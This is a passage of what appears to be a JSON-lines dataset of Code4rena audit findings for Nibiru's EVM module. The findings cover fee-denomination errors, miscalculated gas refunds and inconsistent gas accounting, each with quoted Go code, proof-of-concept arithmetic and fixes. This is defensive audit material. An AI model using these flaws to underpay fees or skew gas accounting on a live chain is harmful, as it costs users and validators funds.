fees = append(fees, sdk.NewCoin(evmDenom, feeAmt)) // Fee() returns wei amount\n}\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/msg.go#L367)\n\nThe `Fee()` function in `tx_data_legacy.go` calculates fees in wei:\n```go\nfunc (tx LegacyTx) Fee() *big.Int {\n    return priceTimesGas(tx.GetGasPrice(), tx.GetGas())\n}\n```\n\nTo demonstrate the impact:\n1. A transaction with a gas price of 1 wei and gas limit of 21000 would result in a fee of 21000 wei\n2. This should be converted to 0.000021 unibi (21000 / 10^12)\n3. However, the current code would set it as 21000 unibi, which is incorrect by a factor of 10^12\n\n## Recommended mitigation steps\n\n1. In `evmante_validate_basic.go`, modify the fee validation to convert from wei to unibi:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee())),\n    },\n)\n```\n\n2. In `msg.go`, update the fee conversion in `BuildTx`:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee()))\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt))\n}\n```\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe Nibiru EVM module incorrectly handles fee denominations during transaction validation and building, failing to convert wei amounts to the native unibi denomination. This can lead to significant discrepancies in fee calculations and potentially allow users to pay far fewer fees than intended.\n\nThe issue occurs in two locations:\n\n1. Transaction validation in `evmante_validate_basic.go`\n2. Transaction building in `msg.go`\n\nIn both cases, fees that are calculated in wei (1e18 units) are directly used with `evm.EVMBankDenom` (unibi), without converting from wei to unibi (1e6 units). This causes an undervaluation of fees by a factor of 10^12, as the system expects fees in unibi but receives them in wei.\n\n## Proof of Concept\n\n1. In `evmante_validate_basic.go`, the fee validation directly uses the wei amount:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(txData.Fee()), // Fee() returns wei amount\n    },\n)\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128)\n\n2. Similarly in `msg.go`, when building a transaction:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(txData.Fee())\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt)) // Fee() returns wei amount\n}\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/msg.go#L367)\n\nThe `Fee()` function in `tx_data_legacy.go` calculates fees in wei:\n```go\nfunc (tx LegacyTx) Fee() *big.Int {\n    return priceTimesGas(tx.GetGasPrice(), tx.GetGas())\n}\n```\n\nTo demonstrate the impact:\n1. A transaction with a gas price of 1 wei and gas limit of 21000 would result in a fee of 21000 wei\n2. This should be converted to 0.000021 unibi (21000 / 10^12)\n3. However, the current code would set it as 21000 unibi, which is incorrect by a factor of 10^12\n\n## Recommended mitigation steps\n\n1. In `evmante_validate_basic.go`, modify the fee validation to convert from wei to unibi:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee())),\n    },\n)\n```\n\n2. In `msg.go`, update the fee conversion in `BuildTx`:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee()))\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt))\n}\n```"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-045", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 45, "page_start": null, "title": "Gas refunds use block gas instead of transaction gas, leading to incorrect refund amounts", "short_summary": null, "description_md": "## Finding description and impact\n\nThere is a mismatch between how gas fees are deducted and refunded in the EVM implementation:\n\n1. In `evmante_gas_consume.go`, gas fees are deducted upfront based on each transaction's individual gas limit\n2. However, the refund calculation in `msg_server.go` uses the cumulative block gas usage to determine refunds for individual transactions\n\nThis mismatch means users will receive incorrect (lower) refunds than they should. The gas refund should be based on the difference between a transaction's gas limit (what was charged) and its actual gas usage (what was consumed), not the block's total gas usage.\n\nThe impact is that users will lose funds as they receive smaller refunds than they should. This becomes especially problematic when multiple transactions are included in a block, as the cumulative block gas increases with each transaction, reducing refunds for subsequent transactions.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThere is a mismatch between how gas fees are deducted and refunded in the EVM implementation:\n\n1. In `evmante_gas_consume.go`, gas fees are deducted upfront based on each transaction's individual gas limit\n2. However, the refund calculation in `msg_server.go` uses the cumulative block gas usage to determine refunds for individual transactions\n\nThis mismatch means users will receive incorrect (lower) refunds than they should. The gas refund should be based on the difference between a transaction's gas limit (what was charged) and its actual gas usage (what was consumed), not the block's total gas usage.\n\nThe impact is that users will lose funds as they receive smaller refunds than they should. This becomes especially problematic when multiple transactions are included in a block, as the cumulative block gas increases with each transaction, reducing refunds for subsequent transactions.\n\n## Proof of Concept\n\nThe issue stems from two pieces of code:\n\n1. Gas fees are deducted in `evmante_gas_consume.go` based on transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\t\tfees, err := keeper.VerifyFee(\n\t\t\ttxData,\n\t\t\tevm.EVMBankDenom,\n\t\t\tbaseFeeMicronibiPerGas,\n\t\t\tctx.IsCheckTx(),\n\t\t)\n```\n\nWhere `VerifyFee` returns the fee based on the transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/gas_fees.go#L194-L200\n\tfeeAmtMicronibi := evm.WeiToNative(txData.EffectiveFeeWei(baseFeeWei))\n\tif feeAmtMicronibi.Sign() == 0 {\n\t\t// zero fee, no need to deduct\n\t\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.ZeroInt()}}, nil\n\t}\n\n\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.NewIntFromBigInt(feeAmtMicronibi)}}, nil\n```\n\n2. But refunds in `msg_server.go` are calculated using block gas:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L87-L93\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    return nil, errors.Wrap(err, \"EthereumTx: error adding transient gas used to block\")\n}\n\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n```\n\nTo demonstrate the impact, consider this scenario:\n\n1. Transaction A has gas limit 100,000 and uses 50,000 gas\n2. Transaction B has gas limit 100,000 and uses 40,000 gas\n3. When calculating the refund for transaction B:\n   - It should receive: 100,000 - 40,000 = 60,000 gas refund\n   - But actually receives: 100,000 - (50,000 + 40,000) = 10,000 gas refund\n   - The user loses refund for 50,000 gas\n\n## Recommended mitigation steps\n\nThe refund calculation should be based on each transaction's individual gas usage rather than the block gas. Modify the refund logic in `msg_server.go`:\n\n```go\n// Before\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n\n// After\nrefundGas := uint64(0)\nif evmMsg.Gas() > evmResp.GasUsed {\n    refundGas = evmMsg.Gas() - evmResp.GasUsed\n}\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n```\n\nThis ensures that each transaction's refund is calculated based on its own gas limit and usage, independent of other transactions in the block.\n", "sections": {"description_md": "## Finding description and impact\n\nThere is a mismatch between how gas fees are deducted and refunded in the EVM implementation:\n\n1. In `evmante_gas_consume.go`, gas fees are deducted upfront based on each transaction's individual gas limit\n2. However, the refund calculation in `msg_server.go` uses the cumulative block gas usage to determine refunds for individual transactions\n\nThis mismatch means users will receive incorrect (lower) refunds than they should. The gas refund should be based on the difference between a transaction's gas limit (what was charged) and its actual gas usage (what was consumed), not the block's total gas usage.\n\nThe impact is that users will lose funds as they receive smaller refunds than they should. This becomes especially problematic when multiple transactions are included in a block, as the cumulative block gas increases with each transaction, reducing refunds for subsequent transactions.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nThe refund calculation should be based on each transaction's individual gas usage rather than the block gas. Modify the refund logic in `msg_server.go`:\n\n```go\n// Before\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n\n// After\nrefundGas := uint64(0)\nif evmMsg.Gas() > evmResp.GasUsed {\n    refundGas = evmMsg.Gas() - evmResp.GasUsed\n}\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n```\n\nThis ensures that each transaction's refund is calculated based on its own gas limit and usage, independent of other transactions in the block.\n", "poc_md": "## Proof of Concept\n\nThe issue stems from two pieces of code:\n\n1. Gas fees are deducted in `evmante_gas_consume.go` based on transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\t\tfees, err := keeper.VerifyFee(\n\t\t\ttxData,\n\t\t\tevm.EVMBankDenom,\n\t\t\tbaseFeeMicronibiPerGas,\n\t\t\tctx.IsCheckTx(),\n\t\t)\n```\n\nWhere `VerifyFee` returns the fee based on the transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/gas_fees.go#L194-L200\n\tfeeAmtMicronibi := evm.WeiToNative(txData.EffectiveFeeWei(baseFeeWei))\n\tif feeAmtMicronibi.Sign() == 0 {\n\t\t// zero fee, no need to deduct\n\t\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.ZeroInt()}}, nil\n\t}\n\n\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.NewIntFromBigInt(feeAmtMicronibi)}}, nil\n```\n\n2. But refunds in `msg_server.go` are calculated using block gas:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L87-L93\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    return nil, errors.Wrap(err, \"EthereumTx: error adding transient gas used to block\")\n}\n\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n```\n\nTo demonstrate the impact, consider this scenario:\n\n1. Transaction A has gas limit 100,000 and uses 50,000 gas\n2. Transaction B has gas limit 100,000 and uses 40,000 gas\n3. When calculating the refund for transaction B:\n   - It should receive: 100,000 - 40,000 = 60,000 gas refund\n   - But actually receives: 100,000 - (50,000 + 40,000) = 10,000 gas refund\n   - The user loses refund for 50,000 gas\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThere is a mismatch between how gas fees are deducted and refunded in the EVM implementation:\n\n1. In `evmante_gas_consume.go`, gas fees are deducted upfront based on each transaction's individual gas limit\n2. However, the refund calculation in `msg_server.go` uses the cumulative block gas usage to determine refunds for individual transactions\n\nThis mismatch means users will receive incorrect (lower) refunds than they should. The gas refund should be based on the difference between a transaction's gas limit (what was charged) and its actual gas usage (what was consumed), not the block's total gas usage.\n\nThe impact is that users will lose funds as they receive smaller refunds than they should. This becomes especially problematic when multiple transactions are included in a block, as the cumulative block gas increases with each transaction, reducing refunds for subsequent transactions.\n\n## Proof of Concept\n\nThe issue stems from two pieces of code:\n\n1. Gas fees are deducted in `evmante_gas_consume.go` based on transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\t\tfees, err := keeper.VerifyFee(\n\t\t\ttxData,\n\t\t\tevm.EVMBankDenom,\n\t\t\tbaseFeeMicronibiPerGas,\n\t\t\tctx.IsCheckTx(),\n\t\t)\n```\n\nWhere `VerifyFee` returns the fee based on the transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/gas_fees.go#L194-L200\n\tfeeAmtMicronibi := evm.WeiToNative(txData.EffectiveFeeWei(baseFeeWei))\n\tif feeAmtMicronibi.Sign() == 0 {\n\t\t// zero fee, no need to deduct\n\t\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.ZeroInt()}}, nil\n\t}\n\n\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.NewIntFromBigInt(feeAmtMicronibi)}}, nil\n```\n\n2. But refunds in `msg_server.go` are calculated using block gas:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L87-L93\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    return nil, errors.Wrap(err, \"EthereumTx: error adding transient gas used to block\")\n}\n\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n```\n\nTo demonstrate the impact, consider this scenario:\n\n1. Transaction A has gas limit 100,000 and uses 50,000 gas\n2. Transaction B has gas limit 100,000 and uses 40,000 gas\n3. When calculating the refund for transaction B:\n   - It should receive: 100,000 - 40,000 = 60,000 gas refund\n   - But actually receives: 100,000 - (50,000 + 40,000) = 10,000 gas refund\n   - The user loses refund for 50,000 gas\n\n## Recommended mitigation steps\n\nThe refund calculation should be based on each transaction's individual gas usage rather than the block gas. Modify the refund logic in `msg_server.go`:\n\n```go\n// Before\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n\n// After\nrefundGas := uint64(0)\nif evmMsg.Gas() > evmResp.GasUsed {\n    refundGas = evmMsg.Gas() - evmResp.GasUsed\n}\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n```\n\nThis ensures that each transaction's refund is calculated based on its own gas limit and usage, independent of other transactions in the block.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThere is a mismatch between how gas fees are deducted and refunded in the EVM implementation:\n\n1. In `evmante_gas_consume.go`, gas fees are deducted upfront based on each transaction's individual gas limit\n2. However, the refund calculation in `msg_server.go` uses the cumulative block gas usage to determine refunds for individual transactions\n\nThis mismatch means users will receive incorrect (lower) refunds than they should. The gas refund should be based on the difference between a transaction's gas limit (what was charged) and its actual gas usage (what was consumed), not the block's total gas usage.\n\nThe impact is that users will lose funds as they receive smaller refunds than they should. This becomes especially problematic when multiple transactions are included in a block, as the cumulative block gas increases with each transaction, reducing refunds for subsequent transactions.\n\n## Proof of Concept\n\nThe issue stems from two pieces of code:\n\n1. Gas fees are deducted in `evmante_gas_consume.go` based on transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_gas_consume.go#L100-L105\n\t\tfees, err := keeper.VerifyFee(\n\t\t\ttxData,\n\t\t\tevm.EVMBankDenom,\n\t\t\tbaseFeeMicronibiPerGas,\n\t\t\tctx.IsCheckTx(),\n\t\t)\n```\n\nWhere `VerifyFee` returns the fee based on the transaction gas limit:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/gas_fees.go#L194-L200\n\tfeeAmtMicronibi := evm.WeiToNative(txData.EffectiveFeeWei(baseFeeWei))\n\tif feeAmtMicronibi.Sign() == 0 {\n\t\t// zero fee, no need to deduct\n\t\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.ZeroInt()}}, nil\n\t}\n\n\treturn sdk.Coins{{Denom: denom, Amount: sdkmath.NewIntFromBigInt(feeAmtMicronibi)}}, nil\n```\n\n2. But refunds in `msg_server.go` are calculated using block gas:\n```go\n// https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L87-L93\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    return nil, errors.Wrap(err, \"EthereumTx: error adding transient gas used to block\")\n}\n\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n```\n\nTo demonstrate the impact, consider this scenario:\n\n1. Transaction A has gas limit 100,000 and uses 50,000 gas\n2. Transaction B has gas limit 100,000 and uses 40,000 gas\n3. When calculating the refund for transaction B:\n   - It should receive: 100,000 - 40,000 = 60,000 gas refund\n   - But actually receives: 100,000 - (50,000 + 40,000) = 10,000 gas refund\n   - The user loses refund for 50,000 gas\n\n## Recommended mitigation steps\n\nThe refund calculation should be based on each transaction's individual gas usage rather than the block gas. Modify the refund logic in `msg_server.go`:\n\n```go\n// Before\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nrefundGas := uint64(0)\nif evmMsg.Gas() > blockGasUsed {\n    refundGas = evmMsg.Gas() - blockGasUsed\n}\n\n// After\nrefundGas := uint64(0)\nif evmMsg.Gas() > evmResp.GasUsed {\n    refundGas = evmMsg.Gas() - evmResp.GasUsed\n}\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n```\n\nThis ensures that each transaction's refund is calculated based on its own gas limit and usage, independent of other transactions in the block."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-046", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 46, "page_start": null, "title": "Gas used mismatch in failed contract calls can lead to wrong gas deductions", "short_summary": null, "description_md": "## Finding description and impact\n\nIn `call_contract.go`, when a contract call fails, the code only consumes gas for the failed transaction but does not account for previously accumulated block gas usage. This creates a mismatch between the actual gas used in the block and what gets consumed in the gas meter.\n\nThe issue occurs in the error handling path of `CallContractWithInput` where after a failed call, only the gas of the failed transaction is consumed:\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes gas for this tx\n    // ... error handling\n}\n```\n\nHowever, in the success path, the code correctly adds the gas used to the block total:\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n// ...\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\nThis inconsistency means that failed transactions do not properly contribute to the block's gas tracking. This is especially bad when the failed transaction is the last one in a block, as it will decrease the gas counter heavily (only the last transaction vs. the sum of all).\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nIn `call_contract.go`, when a contract call fails, the code only consumes gas for the failed transaction but does not account for previously accumulated block gas usage. This creates a mismatch between the actual gas used in the block and what gets consumed in the gas meter.\n\nThe issue occurs in the error handling path of `CallContractWithInput` where after a failed call, only the gas of the failed transaction is consumed:\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes gas for this tx\n    // ... error handling\n}\n```\n\nHowever, in the success path, the code correctly adds the gas used to the block total:\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n// ...\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\nThis inconsistency means that failed transactions do not properly contribute to the block's gas tracking. This is especially bad when the failed transaction is the last one in a block, as it will decrease the gas counter heavily (only the last transaction vs. the sum of all).\n\n\n## Proof of Concept\n\nThe issue can be found in [call_contract.go#L118](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118):\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes failed tx gas\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    if evmResp.VmError == vm.ErrExecutionReverted.Error() {\n        err = fmt.Errorf(\"VMError: %w\", evm.NewRevertError(evmResp.Ret))\n        return\n    }\n    err = fmt.Errorf(\"VMError: %s\", evmResp.VmError)\n    return\n}\n```\n\nCompared to the success path at [call_contract.go#L133](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L133):\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\n## Recommended mitigation steps\n\nTo fix this issue, the gas accounting should be consistent between success and failure paths. Add the block gas tracking before handling the failure case:\n\n```go\n// Add to block gas used regardless of success/failure\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n\nif evmResp.Failed() {\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    // ... rest of error handling\n}\n```\n\nThis ensures that all gas used, whether from successful or failed transactions, is properly accounted for in the block total.\n", "sections": {"description_md": "## Finding description and impact\n\nIn `call_contract.go`, when a contract call fails, the code only consumes gas for the failed transaction but does not account for previously accumulated block gas usage. This creates a mismatch between the actual gas used in the block and what gets consumed in the gas meter.\n\nThe issue occurs in the error handling path of `CallContractWithInput` where after a failed call, only the gas of the failed transaction is consumed:\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes gas for this tx\n    // ... error handling\n}\n```\n\nHowever, in the success path, the code correctly adds the gas used to the block total:\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n// ...\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\nThis inconsistency means that failed transactions do not properly contribute to the block's gas tracking. This is especially bad when the failed transaction is the last one in a block, as it will decrease the gas counter heavily (only the last transaction vs. the sum of all).\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nTo fix this issue, the gas accounting should be consistent between success and failure paths. Add the block gas tracking before handling the failure case:\n\n```go\n// Add to block gas used regardless of success/failure\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n\nif evmResp.Failed() {\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    // ... rest of error handling\n}\n```\n\nThis ensures that all gas used, whether from successful or failed transactions, is properly accounted for in the block total.\n", "poc_md": "## Proof of Concept\n\nThe issue can be found in [call_contract.go#L118](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118):\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes failed tx gas\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    if evmResp.VmError == vm.ErrExecutionReverted.Error() {\n        err = fmt.Errorf(\"VMError: %w\", evm.NewRevertError(evmResp.Ret))\n        return\n    }\n    err = fmt.Errorf(\"VMError: %s\", evmResp.VmError)\n    return\n}\n```\n\nCompared to the success path at [call_contract.go#L133](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L133):\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nIn `call_contract.go`, when a contract call fails, the code only consumes gas for the failed transaction but does not account for previously accumulated block gas usage. This creates a mismatch between the actual gas used in the block and what gets consumed in the gas meter.\n\nThe issue occurs in the error handling path of `CallContractWithInput` where after a failed call, only the gas of the failed transaction is consumed:\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes gas for this tx\n    // ... error handling\n}\n```\n\nHowever, in the success path, the code correctly adds the gas used to the block total:\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n// ...\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\nThis inconsistency means that failed transactions do not properly contribute to the block's gas tracking. This is especially bad when the failed transaction is the last one in a block, as it will decrease the gas counter heavily (only the last transaction vs. the sum of all).\n\n\n## Proof of Concept\n\nThe issue can be found in [call_contract.go#L118](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118):\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes 